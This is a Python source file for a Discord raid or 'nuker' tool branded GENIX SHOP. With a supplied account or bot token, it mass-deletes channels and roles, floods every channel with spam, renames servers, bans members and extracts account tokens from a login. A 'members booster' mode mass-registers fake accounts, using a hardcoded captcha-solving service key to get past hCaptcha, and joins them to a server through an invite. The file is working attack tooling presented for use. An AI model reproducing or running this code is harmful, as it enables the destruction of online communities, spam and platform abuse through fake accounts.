import time
import json
import os
import threading
import random

try:
	from pystyle import Colors, Colorate, Box
	import discord
	from discord.ext import commands
	import requests
	from capmonster_python import HCaptchaTask
except ImportError:
	os.system("pip install requests")
	os.system("pip install pystyle")
	os.system("pip install discord")
	os.system("pip install capmonster_python")

done = 0
userID = []

def headers_reg():
    response1 = requests.get("https://discord.com")
    cookie = response1.cookies.get_dict()
    cookie['locale'] = "us"
    __dcfduid = cookie['__dcfduid']
    __sdcfduid = cookie['__sdcfduid']
    __cfruid = cookie['__cfruid']
    headers = {
           "accept": "*/*",
           "authority": "discord.com",
           "method": "POST",
           "path": "/api/v9/auth/register",
           "scheme": "https",
           "origin": "discord.com",
           "referer": "discord.com/register",
           "x-debug-options": "bugReporterEnabled",
           "accept-language": "en-US,en;q=0.9",
           "connection": "keep-alive",
           "content-Type": "application/json",
           "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
           "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA0OTY3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
           "sec-fetch-dest": "empty",
           "sec-fetch-mode": "cors",
           "sec-fetch-site": "same-origin",
           "cookie": f"__dcfduid={__dcfduid};__sdcfduid={__sdcfduid};_gcl_au=1.1.112584149.1686070530;OptanonConsent=isIABGlobal=false&datestamp=Tue+Jun+06+2023+23%3A55%3A30+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2FADJqYCUD&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1;_ga=GA1.1.1610756780.1686070537;_ga_Q149DFWHT7=GS1.1.1686070536.1.0.1686070539.0.0.0;__cf_bm=btpRH4vTOEcwikDHB0QBu404QuPhOivnK86ngimpulA-1686711134-0-ATfCY3ZxHGCsLUjU9HVNEX3RRk45FFeLwMkv5r21pc1VyYri80f0okPZqwv5f9aPDA==;__cfruid={__cfruid}"
    }
    return headers
	
def genixshop(token,guild,na):
	res = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token},json={"type":0,"name":na,"permission_overwrites":[]})
	if res.status_code == 201 or res.status_code == 200:
		id = res.json()['id']
		print(Colorate.Horizontal(Colors.rainbow, f"              [+] Create Channels - {id} Text"))
	elif res.status_code == 404:
		print(Colorate.Horizontal(Colors.rainbow, f"""               [-] Unknown server - '{guild}' """), end="\r")
	elif res.status_code == 400:
		print(Colorate.Horizontal(Colors.rainbow, f"               [-] The server ID format is invalid "), end="\r")
	elif res.status_code == 429:
		tim = res.json()['retry_after']
		print(Colorate.Horizontal(Colors.rainbow, f"               [-] RalteLimited For {tim} seconds !"))
	else:
		print(res,res.json())
		
def genixshop2(token,guild,na):
	res = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token},json={"type":2,"name":na,"permission_overwrites":[]})
	if res.status_code == 201 or res.status_code == 200:
		id = res.json()['id']
		print(Colorate.Horizontal(Colors.rainbow, f"              [+] Create Channels - {id} Voice"))
	elif res.status_code == 404:
		print(Colorate.Horizontal(Colors.rainbow, f"""               [-] Unknown server - '{guild}' """), end="\r")
	elif res.status_code == 400:
		print(Colorate.Horizontal(Colors.rainbow, f"               [-] The server ID format is invalid "), end="\r")
	elif res.status_code == 429:
		tim = res.json()['retry_after']
		print(Colorate.Horizontal(Colors.rainbow, f"               [-] RalteLimited For {tim} !"))
	else:
		print(res,res.json())
		
def request_fingerprint():
	response2 = requests.get("https://discordapp.com/api/v9/experiments", headers=headers_reg()).json()
	fingerprint = response2["fingerprint"]
	return fingerprint
		
def hcaptcha():
	try:
		capmonster = HCaptchaTask("bfc4a11b875c449929055ac3a3abc88c")
		task_id = capmonster.create_task("https://discord.com", "f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34")
		result = capmonster.join_task_result(task_id)
		return result.get("gRecaptchaResponse")
	except:
		print(Colorate.Horizontal(Colors.rainbow, f"               [-] Please check the information and try again !"))
		time.sleep(2)
		homepage()
		
def hcaptcha2():
	try:
		capmonster = HCaptchaTask("bfc4a11b875c449929055ac3a3abc88c")
		task_id = capmonster.create_task("https://discord.com", "4c672d35-0701-42b2-88c3-78380b0db560")
		result = capmonster.join_task_result(task_id)
		return result.get("gRecaptchaResponse")
	except:
		print(Colorate.Horizontal(Colors.rainbow, f"               [-] Please check the information and try again !"))
		time.sleep(2)
		homepage()
		
def token_checker(tokens):
	headers = {
		"authorization": tokens
	}
	response = requests.get("https://discord.com/api/v9/users/@me/library?country_code=TH", headers = headers)
	if (response.status_code == 401 or response.status_code == 403):
		print()
		print(Colorate.Horizontal(Colors.green_to_cyan, "             [!] ERROR INVILD FOR TOKENS. "))
		time.sleep(2)
		clientattack()
	else:
		pass
		
ban = 0

def get_roles(tokens,server):
	res = requests.get(f"https://discord.com/api/v9/guilds/{server}",headers={"authorization": tokens})
	if res.status_code == 200:
		pass
	elif res.status_code == 404:
		print(Colorate.Horizontal(Colors.rainbow, f"             [-] This server could not be found !"))
		time.sleep(2)
		clientattack()
	elif res.status_code == 400:
		print(Colorate.Horizontal(Colors.rainbow, f"             [-] Invalid server format !"))
		time.sleep(2)
		clientattack()
	elif res.status_code == 401:
		print(Colorate.Horizontal(Colors.rainbow, f"             [-] An error occurred with your token !"))
		time.sleep(2)
		clientattack()
	else:
		print(res,res.json())
	
		
def bans(tokens,server,id):
	global ban
	r = requests.put(f"https://discord.com/api/v9/guilds/{server}/bans/{id}",json={"delete_message_seconds": 3600},headers={"authorization": "Bot "+ tokens})
	if r.status_code == 204 or r.status_code == 201 or r.status_code == 200:
		ban += 1
		print(Colorate.Horizontal(Colors.rainbow, f"             [*] Member has banned ! || total - {ban} members"))
	elif r.status_code == 403:
		print(Colorate.Horizontal(Colors.rainbow, f"             [-] You Missing Permissions !"))
	elif r.status_code == 404:
		print(Colorate.Horizontal(Colors.rainbow, f"             [-] This user does not exist on the server !"))
	else:
		print(r,r.json())
	# success - 204 ไม่มี response
	# 404 guild ที่ไม่รู้จัก code 10004
	# 404 ผู้ใช้ที่ไม่รู้จัก code 10013
	# 403 ไม่มีสิทธิ์อนุญาต code 50013
	# <Response [403]> {'message': 'Missing Permissions', 'code': 50013} = ไม่มีคนให้แบน
	
def kicks():
	r = requests.delete("https://discord.com/api/v9/guilds/1143448217665671228/members/1146004298237489186")
	# success - 204
	
def delete(tk,chann):
	response = requests.delete(f"https://discord.com/api/v9/channels/{chann}",headers={"authorization": f"Bot {tk}"}).json()
		
def create(tk,serv,na):
	try:
		response = requests.post(f"https://discord.com/api/v9/guilds/{serv}/channels",headers={"authorization": f"Bot {tk}"},json={"type":0,"name":na,"permission_overwrites":[]})
	except:
		pass

rolee = 0
		
def delete_roles(tk,guild,r):
	try:
		requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{r}",headers={"authorization": f"Bot {tk}"})
	except:
		pass
		
def delete_roles2(tk,guild,r):
	global rolee
	try:
		r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{r}",headers={"authorization": tk})
		rolee += 1
		# <Response [400]> {'message': 'บทบาทไม่ถูกต้อง', 'code': 50028}
	except:
		pass
		
def create_roles(tk,guild,na):
	try:
		requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers={"authorization": f"Bot {tk}"},json={"name":na,"color":0,"permissions":"0"})
	except:
		pass
		
def edit_server(tk,guild,n):
	requests.patch(f"https://discord.com/api/v9/guilds/{guild}",headers={"authorization": f"Bot {tk}"},json={"name":n,"description":None,"icon":None,"splash":None,"banner":None,"home_header":None,"afk_channel_id":None,"afk_timeout":300,"system_channel_id":None,"verification_level":0,"default_message_notifications":0,"explicit_content_filter":0,"system_channel_flags":0,"public_updates_channel_id":None,"safety_alerts_channel_id":None,"premium_progress_bar_enabled":False})
		
def edit_roles(tk,guild,r,name):
	try:
		requests.patch(f"https://discord.com/api/v9/guilds/{guild}/roles/{r}",headers={"authorization": f"Bot {tk}"},json={"name":name,"permissions":"0","color":0,"hoist":False,"mentionable":False,"icon":None,"unicode_emoji":None})
	except:
		pass
		
def edit_channels(tk,id,na):
	try:
		requests.patch(f"https://discord.com/api/v9/channels/{id}",headers={"authorization": f"Bot {tk}"},json={"name":na,"type":0,"topic":"","bitrate":64000,"user_limit":0,"nsfw":False,"flags":0,"rate_limit_per_user":0})
	except:
		pass
		
def send(tk,id,message):
	requests.post(f"https://discord.com/api/v9/channels/{id}/messages",headers={"authorization": f"Bot {tk}"},json={"content": message})
	
banner = Colorate.DiagonalBackwards(Colors.rainbow, """
░██████╗░███████╗███╗░░██╗██╗██╗░░██╗  ░██████╗██╗░░██╗░█████╗░██████╗░
██╔════╝░██╔════╝████╗░██║██║╚██╗██╔╝  ██╔════╝██║░░██║██╔══██╗██╔══██╗
██║░░██╗░█████╗░░██╔██╗██║██║░╚███╔╝░  ╚█████╗░███████║██║░░██║██████╔╝
██║░░╚██╗██╔══╝░░██║╚████║██║░██╔██╗░  ░╚═══██╗██╔══██║██║░░██║██╔═══╝░
╚██████╔╝███████╗██║░╚███║██║██╔╝╚██╗  ██████╔╝██║░░██║╚█████╔╝██║░░░░░
░╚═════╝░╚══════╝╚═╝░░╚══╝╚═╝╚═╝░░╚═╝  ╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░
""")


def clientattack():
	clear()
	print(banner)
	print()
	print(Colorate.Horizontal(Colors.yellow_to_red, "                      MODE TYPE : CLIENT ATTACK"))
	print()
	print(Colorate.Horizontal(Colors.yellow_to_red, "    [#] Please select the option you want : "))
	print()
	print(Colorate.Diagonal(Colors.rainbow, "                          [G] GET YOUR TOKENS       "))
	print()
	print(Colorate.Diagonal(Colors.rainbow, "       [1] DELETE CHANNELS           [7] MEMBERS BOOSTER"))
	print(Colorate.Diagonal(Colors.rainbow, "       [2] CREATE CHANNELS           [8] DELETE ROLES"))
	print(Colorate.Diagonal(Colors.rainbow, "       [3] SPAM MESSAGE ( NUKER )    [9] None"))
	print(Colorate.Diagonal(Colors.rainbow, "       [4] RENAME SERVER             [10] None"))
	print(Colorate.Diagonal(Colors.rainbow, "       [5] RENAME CHANNELS           [11] None"))
	print(Colorate.Diagonal(Colors.rainbow, "       [6] CREATE ROLES              [12] None"))
	print()
	print(Colorate.Diagonal(Colors.blue_to_red, "                         [00] Back To Home"))
	print()
	select = input(Colorate.Horizontal(Colors.green_to_cyan, "    SELECT MODE : "))
	if (select == "1" or select == "01"):
		print()
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
		token_checker(token)
		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
		print()
		try:
			res = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token})
			if res.json() == []:
				print(Colorate.Horizontal(Colors.rainbow, "             There are no rooms on this server !"))
				time.sleep(2)
				clientattack()
			else:
				for channel in json.loads(res.text):
					def startbot(chann):
						response = requests.delete(f"https://discord.com/api/v9/channels/{chann}",headers={"authorization": f"{token}"})
						if response.status_code == 200:
							id = response.json()['id']
							print(Colorate.Horizontal(Colors.rainbow, f"               [-] Deleted Channels - {id}"))
						else:
							print(Colorate.Horizontal(Colors.rainbow, "             Can't be deleted because you don't have a role !"), end="\r")
					threading.Thread(target=startbot, args=[channel['id']]).start()
				time.sleep(3)
				clientattack()
		except:
			print()
			print(Colorate.Horizontal(Colors.rainbow, "             This server does not exist !"))
			time.sleep(2)
			clientattack()
	elif (select == "00" or select == "0"):
		homepage()
	elif select == "":
		clientattack()
	elif select == "2" or select == "02":
		print()
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
		token_checker(token)
		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
		type = input(Colorate.Horizontal(Colors.green_to_cyan, "         What kind do you want to build (voice,text) : "))
		na = input(Colorate.Horizontal(Colors.green_to_cyan, "         NICKNAME : "))
		if type == "voice" or type == "Voice" or type == "v" or type == "V":
			try:
				jam = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUMBER : ")))
				print()
				
				for i in range(jam):
					threading.Thread(target=genixshop2, args=[token,guild,na]).start()
				time.sleep(2)
				clientattack()
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
				time.sleep(2)
				clientattack()
		else:
			try:
				jam = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUMBER : ")))
				print()
				
				for i in range(jam):
					threading.Thread(target=genixshop, args=[token,guild,na]).start()
				time.sleep(2)
				clientattack()
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
				time.sleep(2)
				clientattack()
				
	elif select == "g" or select == "G":
		print()
		username = input(Colorate.Horizontal(Colors.green_to_cyan, "         USERNAME : "))
		password = input(Colorate.Horizontal(Colors.green_to_cyan, "         PASSWORD : "))
		print()
		
		if (username == "" or password == ""):
			clientattack()
		else:
			headers = {
				"x-fingerprint": request_fingerprint(),
				"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
				"content-type": "application/json"
			}
			response2 = requests.post("https://discord.com/api/v9/auth/login",headers=headers,json={"login":username,"password":password,"undelete":False,"login_source":None,"gift_code_sku_id":None,"captcha_key": hcaptcha()})
			if response2.status_code == 400:
				print(Colorate.Horizontal(Colors.rainbow, f"               [-] Username or Password Wrong !"))
				time.sleep(2)
				clientattack()
			elif response2.status_code == 200:
				tokens = response2.json()['token']
				print(Colorate.Horizontal(Colors.rainbow, f"               [+] {tokens}"))
				print("\n")
				input(Colorate.Horizontal(Colors.rainbow, f"                   PLEASE ENTER TO HOME..."))
				clientattack()
			else:
				print(response2,response2.json())
				
		
	elif select == "3" or select == "03":
		print()
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
		token_checker(token)
		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
		msg = input(Colorate.Horizontal(Colors.green_to_cyan, "         MESSAGE : "))
		type = input(Colorate.Horizontal(Colors.green_to_cyan, "         Do you want to send to all channels? (yes,no) : "))
		if (type == "Yes" or type == "yes" or type == "Y" or type == "y"):
			try:
				num = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUM : ")))
				print()
				
				try:
					res = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token})
					if res.json() == []:
						print()
						print(Colorate.Horizontal(Colors.rainbow, "                There are no rooms on this server !"))
						time.sleep(2)
						clientattack()
					else:
						for i in range(num):
							for channel in json.loads(res.text):
								def startbot(chann,content):
									response = requests.post(f"https://discord.com/api/v9/channels/{chann}/messages",headers={"authorization": token},json={"content": content})
									if response.status_code == 200:
										id = response.json()['id']
										print(Colorate.Horizontal(Colors.rainbow, f"               [+] Sent to Channels - {id}"))
									elif response.status_code == 429:
										re = response.json()['retry_after']
										print(Colorate.Horizontal(Colors.rainbow, f"               [-] RateLimited For - {re}"), end="\r")
										time.sleep(float(re))
									else:
										print(response.json(),response)
								threading.Thread(target=startbot, args=[channel['id'],msg]).start()
						time.sleep(3)
						clientattack()
				except:
					print()
					print(Colorate.Horizontal(Colors.rainbow, "                This server does not exist !"))
					time.sleep(2)
					clientattack()
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "                The number style is invalid !"))
				time.sleep(2)
				clientattack()
		else:
			ch = input(Colorate.Horizontal(Colors.green_to_cyan, "         CHANNEL ID : "))
			try:
				num = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUM : ")))
				print()
				
				def toks(chann,content):
					response = requests.post(f"https://discord.com/api/v9/channels/{chann}/messages",headers={"authorization": token},json={"content": content})
					if response.status_code == 200:
						print(Colorate.Horizontal(Colors.rainbow, f"               [+] Sent to Channels - {ch} Done"))
					elif response.status_code == 429:
						re = response.json()['retry_after']
						print(Colorate.Horizontal(Colors.rainbow, f"               [-] RateLimited For - {re}"), end="\r")
						time.sleep(float(re))
					else:
						print(response.json(),response)
						
				for i in range(num):
					threading.Thread(target=toks, args=[ch,msg]).start()
				
				time.sleep(3)
				clientattack()
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
				time.sleep(2)
				clientattack()
	elif select == "4" or select == "04":
		print()
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
		token_checker(token)
		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
		type = input(Colorate.Horizontal(Colors.green_to_cyan, "         Do you want auto change? (yes,no) : "))
		
		if type == "Yes" or type == "yes" or type == "Y" or type == "y":
			try:
				num = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUM : ")))
				
				print()
				
				def change(serverID,tokens,n):
					response = requests.patch(f"https://discord.com/api/v9/guilds/{serverID}",headers={"authorization": tokens},json={"name":n,"description":None,"icon":None,"splash":None,"banner":None,"home_header":None,"afk_channel_id":None,"afk_timeout":300,"system_channel_id":None,"verification_level":0,"default_message_notifications":0,"explicit_content_filter":0,"system_channel_flags":0,"public_updates_channel_id":None,"safety_alerts_channel_id":None,"premium_progress_bar_enabled":False})
					if response.status_code == 400:
						print(Colorate.Horizontal(Colors.rainbow, f"               [-] Your information is incorrect !"), end="\r")
					elif response.status_code == 403:
						print(Colorate.Horizontal(Colors.rainbow, f"               [-] Could not find this server !"), end="\r")
					elif response.status_code == 200:
						print(Colorate.Horizontal(Colors.rainbow, f"               [+] Change - {guild} Successfully !"))
					elif response.status_code == 429:
						re = response.json()['retry_after']
						print(Colorate.Horizontal(Colors.rainbow, f"               [-] RateLimited For - {re}"), end="\r")
						time.sleep(float(re))
					else:
						print(response,response.json())
				
				for i in range(num):
					u = random.randint(10000000,99999999)
					name = f"GENIX SHOP | {u}"
					threading.Thread(target=change, args=[guild,token,name]).start()
				time.sleep(3)
				clientattack()
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
				time.sleep(2)
				clientattack()
		else:
			try:
				name = input(Colorate.Horizontal(Colors.green_to_cyan, "         NICKNAME : "))
				
				print()
				
				def change(serverID,tokens,n):
					response = requests.patch(f"https://discord.com/api/v9/guilds/{serverID}",headers={"authorization": tokens},json={"name":n,"description":None,"icon":None,"splash":None,"banner":None,"home_header":None,"afk_channel_id":None,"afk_timeout":300,"system_channel_id":None,"verification_level":0,"default_message_notifications":0,"explicit_content_filter":0,"system_channel_flags":0,"public_updates_channel_id":None,"safety_alerts_channel_id":None,"premium_progress_bar_enabled":False})
					if response.status_code == 400:
						print(Colorate.Horizontal(Colors.rainbow, f"               [-] Your information is incorrect !"), end="\r")
					elif response.status_code == 403:
						print(Colorate.Horizontal(Colors.rainbow, f"               [-] Could not find this server !"), end="\r")
					elif response.status_code == 200:
						print(Colorate.Horizontal(Colors.rainbow, f"               [+] Change - {guild} Successfully !"))
					elif response.status_code == 429:
						re = response.json()['retry_after']
						print(Colorate.Horizontal(Colors.rainbow, f"               [-] RateLimited For - {re}"), end="\r")
						time.sleep(float(re))
					else:
						print(response,response.json())
				change(guild,token,name)
				time.sleep(3)
				clientattack()
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
				time.sleep(2)
				clientattack()
	elif select == "5" or select == "05":
		print()
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
		token_checker(token)
		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
		type = input(Colorate.Horizontal(Colors.green_to_cyan, "         Do you want automatic change? (yes,no) : "))
		
		if type == "Yes" or type == "yes" or type == "Y" or type == "y":
			try:
				try:
					num = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUM : ")))
					print()
				except:
					print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
					time.sleep(2)
					clientattack()
				res = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token})
				if res.json() == []:
					print(Colorate.Horizontal(Colors.rainbow, "             There are no rooms on this server !"))
					time.sleep(2)
					clientattack()
				else:
					for i in range(num):
						x = random.randint(1000,9999)
						ty = f"GENIX SHOP | {x}"
						for channel in json.loads(res.text):
							def startbot(chann,tokens,na):
								response = requests.patch(f"https://discord.com/api/v9/channels/{chann}",headers={"authorization": tokens},json={"name":na,"type":0,"topic":"","bitrate":64000,"user_limit":0,"nsfw":False,"flags":0,"rate_limit_per_user":0})
								if response.status_code == 429:
									re = response.json()['retry_after']
									print(Colorate.Horizontal(Colors.rainbow, f"             [-] RalteLimited For {re} !"))
									time.sleep(float(re))
								elif response.status_code == 200:
									id = response.json()['id']
									print(Colorate.Horizontal(Colors.rainbow, f"             [+] Change Channels - {id} Done"))
								else:
									print(response,response.json())
								#if response.status_code == 200:
									#id = response.json()['id']
									#print(Colorate.Horizontal(Colors.rainbow, f"               [-] Deleted Channels - {id}"))
								#else:
									#print(Colorate.Horizontal(Colors.rainbow, "             Can't be deleted because you don't have a role !"), end="\r")
							threading.Thread(target=startbot, args=[channel['id'],token,ty]).start()
					time.sleep(3)
					clientattack()
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "                This server does not exist !"))
				time.sleep(2)
				clientattack()
		else:
			ty = input(Colorate.Horizontal(Colors.green_to_cyan, "         NICKNAME : "))
			print()
			try:
				res = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token})
				if res.json() == []:
					print(Colorate.Horizontal(Colors.rainbow, "             There are no rooms on this server !"))
					time.sleep(2)
					clientattack()
				else:
					for channel in json.loads(res.text):
						def startbot(chann,tokens,na):
							response = requests.patch(f"https://discord.com/api/v9/channels/{chann}",headers={"authorization": tokens},json={"name":na,"type":0,"topic":"","bitrate":64000,"user_limit":0,"nsfw":False,"flags":0,"rate_limit_per_user":0})
							if response.status_code == 429:
								re = response.json()['retry_after']
								print(Colorate.Horizontal(Colors.rainbow, f"             RalteLimited For {re} !"))
								time.sleep(float(re))
							elif response.status_code == 200:
								id = response.json()['id']
								print(Colorate.Horizontal(Colors.rainbow, f"             [+] Change Channels - {id} Done"))
							else:
								print(response,response.json())
						threading.Thread(target=startbot, args=[channel['id'],token,ty]).start()
					time.sleep(3)
					clientattack()
			except:
				print()
				print(Colorate.Horizontal(Colors.rainbow, "                This server does not exist !"))
				time.sleep(2)
				clientattack()
	elif select == "6" or select == "06":
		print()
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
		token_checker(token)
		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
		name = input(Colorate.Horizontal(Colors.green_to_cyan, "         NICKNAME : "))
		
		if guild == None or name == None:
			print(Colorate.Horizontal(Colors.rainbow, "             The input style is invalid !"))
			time.sleep(2)
			clientattack()
		else:
			try:
				num = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUM : ")))
				print()
			except:
				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
				time.sleep(2)
				clientattack()
				
			print()
			def createe(z,tokens,na):
				r = requests.post(f"https://discord.com/api/v9/guilds/{z}/roles",headers={"authorization": tokens},json={"name":na,"color":0,"permissions":"0"})
				if r.status_code == 400:
					print(Colorate.Horizontal(Colors.rainbow, "                This server does not exist !"), end="\r")
				elif r.status_code == 404:
					print(Colorate.Horizontal(Colors.rainbow, "                This server unknow !"), end="\r")
				elif r.status_code == 200:
					id = r.json()['id']
					print(Colorate.Horizontal(Colors.rainbow, f"                [+] Create Roles - {id} Done"))
				else:
					print(r,r.json())
			
			for i in range(num):
				threading.Thread(target=createe, args=[guild,token,name]).start()
			
			time.sleep(3)
			clientattack()
	elif select == "7" or select == "07":
		print()
		invite = input(Colorate.Horizontal(Colors.green_to_cyan, "         INVITE CODE : "))
		
		if invite == "":
			print()
			print(Colorate.Horizontal(Colors.rainbow, "             Input must not be empty !"))
			time.sleep(2)
			clientattack()
		else:
			try:
				# print(Colorate.Horizontal(Colors.rainbow, "             There are no rooms on this server !"))
				num = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUM : ")))
				print()
				
				def booster():
					global done
					s = random.randint(1000,9999)
					mail = f"eijkH{s}eeozk2902{s}@gmail.com"
					target = "https://discord.com/api/v9/auth/register"
					r = requests.post(target,headers=headers_reg(),json={"fingerprint":request_fingerprint(),"email":mail,"username":"GENIX SHOP","password":"As257400","invite":invite,"consent":'true',"date_of_birth":"2000-06-05","gift_code_sku_id":'null',"captcha_key":hcaptcha2(),"promotional_email_opt_in":'true'})
					if r.status_code == 429:
						re = r.json()['retry_after']
						print(Colorate.Horizontal(Colors.rainbow, f"             [-] You stuck raltelimited - {re}"))
						time.sleep(re)
						r2 = requests.post(target,headers=headers_reg(),json={"fingerprint":request_fingerprint(),"email":mail,"username":"GENIX SHOP","password":"As257400","invite":invite,"consent":'true',"date_of_birth":"2000-06-05","gift_code_sku_id":'null',"captcha_key":hcaptcha2(),"promotional_email_opt_in":'true'})
						if r2.status_code == 200 or r2.status_code == 201:
							done += 1
							print(Colorate.Horizontal(Colors.rainbow, f"             [+] Member has joined the server ! || round - {done} "))
						else:
							return r
					elif r.status_code == 200 or r.status_code == 201:
						done += 1
						print(Colorate.Horizontal(Colors.rainbow, f"             [+] Member has joined the server ! || round - {done} "))
					else:
						print(r,r.json())
					
				for i in range(num):
					booster()
				
				global done
				print("\n")
				input(Colorate.Horizontal(Colors.rainbow, f"         Joined total - {done} members !"))
				done = 0
				clientattack()
			except Exception as f:
				print(f)
				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
				time.sleep(2)
				clientattack()
	elif select == "8" or select == "08":
		print()
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
		token_checker(token)
		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
		print()
		
		if guild == "":
			clientattack()
		else:
			res = requests.get(f"https://discord.com/api/v9/guilds/{guild}",headers={"authorization": token})
			if res.status_code == 200:
				roleID = res.json()['roles']
				for role in roleID:
					print(Colorate.Horizontal(Colors.rainbow, f"                  [+] Delete Roles ID - {role['id']}"))
					threading.Thread(target=delete_roles2, args=[token,guild,role['id']]).start()
				time.sleep(3)
				global rolee
				rolee = 0
				clientattack()
			elif res.status_code == 404:
				print(Colorate.Horizontal(Colors.rainbow, f"             [-] This server could not be found !"))
				time.sleep(2)
				clientattack()
			elif res.status_code == 400:
				print(Colorate.Horizontal(Colors.rainbow, f"             [-] Invalid server format !"))
				time.sleep(2)
				clientattack()
			elif res.status_code == 401:
				print(Colorate.Horizontal(Colors.rainbow, f"             [-] An error occurred with your token !"))
				time.sleep(2)
				clientattack()
			else:
				print(res,res.json())
	
	

def botattack():
	clear()
	print(banner)
	print()
	print(Colorate.Horizontal(Colors.yellow_to_red, "                      MODE TYPE : BOT ATTACK"))
	print()
	try:
		token = input(Colorate.Horizontal(Colors.green_to_cyan, "    TOKEN  : "))
		prefix = input(Colorate.Horizontal(Colors.green_to_cyan, "    PREFIX : "))
		print()
		if (token == "" or prefix == ""):
			bot()
	except:
		botattack()
	
	bot = commands.Bot(command_prefix=prefix, intents = discord.Intents.all())
	
	@bot.event
	async def on_ready():
		clear()
		print(banner)
		print()
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}dc | Delete Channels"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}cc <name> <ammo> | Create Text Channels"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}dr | Delete Roles"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}cr <name> <ammo> | Create Roles"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}bomb <message> <ammo> | Spam Message"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}rs <name> | Change Server Nickname"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}rc <name> | Change Channels Nickname"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}auto | Auto Spam Discord Server"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}close | Close ALL"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}start | Ban ALL"))
		print()
		# ลบห้อง print(Colorate.DiagonalBackwards(Colors.rainbow,f"        [-] Deleted Channels 1143448217665671231 Successfully !", True))
		
	@bot.command()
	async def dc(ctx):
		await ctx.message.delete()
		for channel in ctx.guild.channels:
			try:
				threading.Thread(target=delete, args=[token,channel.id]).start()
			except:
				pass
		clear()
		print(banner)
		print()
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}dc | Delete Channels"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}cc <name> <ammo> | Create Text Channels"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}dr | Delete Roles"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}cr <name> <ammo> | Create Roles"))
